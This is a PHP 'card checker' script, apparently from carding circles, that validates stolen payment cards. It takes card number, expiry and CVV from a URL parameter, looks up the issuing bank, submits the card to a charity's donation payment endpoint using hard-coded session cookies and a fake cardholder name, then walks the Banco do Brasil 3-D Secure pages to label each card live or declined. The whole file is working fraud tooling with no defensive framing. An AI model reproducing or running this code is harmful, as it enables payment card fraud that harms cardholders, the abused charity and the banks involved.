<?php

$atualizacao = '02-10-21';
extract($_GET);
error_reporting(0);
set_time_limit(0);

error_reporting(0);
$time = time();
sleep(2);
function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

$card=explode("|",$_GET['lista']);
$cc=$card[0];
$time = time();
$bin = substr($cc, 0, 2);
$mes=$card[1];
$ano=$card[2];
$cvv=$card[3];

switch ($ano) { 
         case '2018':$mes = '18';break; 
         case '2019':$ano = '19';break; 
         case '2020':$ano = '20';break; 
         case '2021':$ano = '21';break; 
         case '2022':$ano = '22';break; 
         case '2023':$ano = '23';break; 
         case '2024':$ano = '24';break; 
         case '2025':$ano = '25';break; 
         case '2026':$ano = '26';break; 
         case '2027':$ano = '27';break; 
         case '2028':$ano = '28';break; 
}

function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

function dadosnome() {
	$nome = file("lista_nomes.txt");
	$mynome = rand(0, sizeof($nome)-1);
	$nome = $nome[$mynome];
	return $nome;
}
function dadossobre() {
	$sobrenome = file("lista_sobrenomes.txt");
	$mysobrenome = rand(0, sizeof($sobrenome)-1);
	$sobrenome = $sobrenome[$mysobrenome];
	return $sobrenome;

}

function ano12() {
	switch ($ano) {
		case '20': $ano = '2020'; break;
		case '21': $ano = '2021'; break;
		case '22': $ano = '2022'; break;
		case '23': $ano = '2023'; break;
		case '24': $ano = '2024'; break;
		case '25': $ano = '2025'; break;
		case '26': $ano = '2026'; break;
		case '27': $ano = '2027'; break;
		case '28': $ano = '2028'; break;
		case '29': $ano = '2029'; break;
	}}
function mes12() {
	switch ($mes) {
		case '1': $mes = '01'; break;
		case '2': $mes = '02'; break;
		case '3': $mes = '03'; break;
		case '4': $mes = '04'; break;
		case '5': $mes = '05'; break;
		case '6': $mes = '06'; break;
		case '7': $mes = '07'; break;
		case '8': $mes = '08'; break;
		case '9': $mes = '09'; break;
		case '10': $mes = '10'; break;
		case '11': $mes = '11'; break;
		case '12': $mes = '12'; break;
	}}

$mes13 = mes12();
$ano13 = ano12();


/*AMY_HALLS/*/

$bin = substr($cc, 0, 6); 

$file = 'bins.csv'; 

$searchfor = $bin; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
  $encontrada = implode("\n", $matches[0]); 
} 
$pieces = explode(";", $encontrada); 
$c = count($pieces); 
if ($c == 8) { 
  $pais = $pieces[4]; 
  $paiscode = $pieces[5]; 
  $banco = $pieces[2]; 
  $level = $pieces[3]; 
  $bandeira = $pieces[1]; 
}else { 
  $pais = $pieces[5]; 
  $paiscode = $pieces[6]; 
  $level = $pieces[4]; 
  $banco = $pieces[2]; 
  $bandeira = $pieces[1]; 
} 
 
$bin_result = "$bandeira $banco $level $pais";
$bin=substr($cc,0,6);

if($bin[0] == 4){ //visa
    $host          = 'www58.bb.com.br';
    $auth          = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb';
    $inicio        = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/inicio.bb';
    $customer      = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/customer.bb';
    $r_customer    = 'https://www58.bb.com.br/ThreeDSecureAuth/gcs/statics/gas/validacao.bb?urlRetorno=/ThreeDSecureAuth/vbvLogin/customer.bb';    
}else{ //master
    $host          = 'www66.bb.com.br';
    $auth          = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/auth.bb';
    $inicio        = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/inicio.bb';
    $customer      = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/customer.bb';
    $r_customer    = 'https://www66.bb.com.br/SecureCodeAuth/gcs/statics/gas/validacao.bb?urlRetorno=/SecureCodeAuth/scdLogin/customer.bb';    
}

#Pegue a requisição de pagamento e coleque aqui
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bagis.tdv.org/DonationPayment');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(	
    'Host: bagis.tdv.org',
    'Connection: keep-alive',
    'Origin: https://bagis.tdv.org',
    'Content-Type: application/x-www-form-urlencoded',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'cookie: TiPMix=62.2116244222092',
    'cookie: x-ms-routing-name=self',
    'cookie: .AspNetCore.UserKey=c01827a2546d4ea7b97462fb73134d92',
    'cookie: .AspNetCore.Currency=949',
    'cookie: .AspNetCore.Antiforgery.9fXoN5jHCXs=CfDJ8GSmlGuD1UlJpAkFAD7JkBjOcwbtcIFelgQSDOif1kbe_vkW-ZKyXnyZu2KU_lyc-JX_QU9_2dO-mqmXtpapYVd1nDp5Sqww8i8yMd2u8AbXCD1qRZTITh8JAuRpiLOOKYXDOAxth_13xMA-PcMSsqY',
    'cookie: ARRAffinity=cc5c278a1be4f576d452433711bb103e3f84a5d8da4e93dfc41ea3bcb5a3b606',
    'cookie: ARRAffinitySameSite=cc5c278a1be4f576d452433711bb103e3f84a5d8da4e93dfc41ea3bcb5a3b606',
    'cookie: ai_user=gvKRD|2021-12-11T14:01:05.530Z',
    'cookie: _fbp=fb.1.1639231265875.482181480',
    'cookie: _ga=GA1.2.537767834.1639231266',
    'cookie: _gid=GA1.2.568764616.1639231266',
    'cookie: XSRF-TOKEN=CfDJ8GSmlGuD1UlJpAkFAD7JkBgooit71d1uj8Vxu6TActD9-zsgX4HXS98qPFWRL41YiQ9M0zSzedW4WQ4ylefYIj6qUAW47TfKp2-J5K6RYNxGhT2zb8TJeUKSnfttKvEbZk12W1bdHs2EWWe0zin-u-Q',
    'cookie: ai.session=mhpsK|1639234330998|1639236005668.4'
	
));

curl_setopt($ch, CURLOPT_POSTFIELDS, "CardHolderName=GABRIEL+OLIVEIRA&CardNumber=$cc&MonthAndYear=$mes+%2F+$ano&Cvv=$cvv&__RequestVerificationToken=CfDJ8GSmlGuD1UlJpAkFAD7JkBgI5Bm8W9tcmQHVGjVDD6D88y_CadnEg77HjHspNM90Piz4H8qM7dX2xNRd7ZrZ-2naOjAdOtK1L3agrvlYDh80HqDWLkxG5-arP-FfYDGa7t0O8A2cOhsjEIfjqg6TMg0");
$result = curl_exec($ch);

#Fim
$pareq=urlencode(getstr($result,'"PaReq" value="','"'));
$term=urlencode(getstr($result,'"TermUrl" value="','"'));
$md=urlencode(getstr($result,'"MD" value="','"'));

sleep (1);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $inicio);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE,__DIR__.'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,__DIR__.'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "TermUrl=$term&PaReq=$pareq&MD=$md");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: '.$host;
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Sec-Ch-Ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Origin: https://www66.bb.com.br';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Dnt: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: '.$auth;
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9';
$headers[] = 'Cookie: _gcl_au=1.1.1225580064.1618783654; JSESSIONID=vMvxRyCTASeJ1D-tES164zplu4fveFR_eVHFA6_NknzmRUZywnpX!1714524820';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

if(strpos($result, 'Abra o aplicativo do BB em seu smartphone')){
    exit('<span class="badge badge-pill badge-info">Aprovada</span><font> <span class="badge badge-pill badge-success">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span><font> <span class="badge badge-pill badge-light">'.$bandeira.' '.$level.'</span><font> <span class="badge badge-pill badge-warning">'.$banco.'</span></font> <span class="badge badge-success badge-sm">'."QR CODE".' </span> <span class="badge badge-dark">@cofs</font> <br>');
}elseif(strpos($result, 'Ocorreu um erro durante o processamento de sua')){ 
    exit('<span class="badge badge-danger">Reprovada</span><font> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'| </font> <span class="badge badge-danger"> [PAGAMENTO RECUSADO] </span> <font> <span class="badge badge-danger">@cofs</font> <br>');
}
   
// CUSTOMER
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $customer);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE,__DIR__.'/cookie.txt');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: '.$host;
$headers[] = 'Sec-Ch-Ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Dnt: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: '.$r_customer;
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

if (strpos($result, 'Prezado cliente, voc&ecirc; n&atilde;o possui o M&oacute')){

    exit('<span class="badge badge-pill badge-info">Aprovada</span><font> <span class="badge badge-pill badge-success">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span><font> <span class="badge badge-pill badge-light">'.$bandeira.' '.$level.'</span><font> <span class="badge badge-pill badge-warning">'.$banco.'</span><font> <span class="badge badge-success badge-sm"> '."SEM VBV".' </span> <span class="badge badge-dark">@cofs</font> <br>');
}elseif (strpos($result, 'Selecione um celular para receber ')){

    exit('<span class="badge badge-pill badge-info">Aprovada</span><font> <span class="badge badge-pill badge-success">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span><font> <span class="badge badge-pill badge-light">'.$bandeira.' '.$level.'</span><font> <span class="badge badge-pill badge-warning">'.$banco.'</span></font> <span class="badge badge-success badge-sm">'."VBV SMS".' </span> <span class="badge badge-dark">@cofs</font> <br>');
}else{
    exit('<span class="badge badge-danger">Reprovada</span><font> <span class="badge badge-pill badge-primary">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'| </font> <span class="badge badge-danger"> [PAGAMENTO RECUSADO] </span> <font> <span class="badge badge-danger">@cofs</font> <br>');
}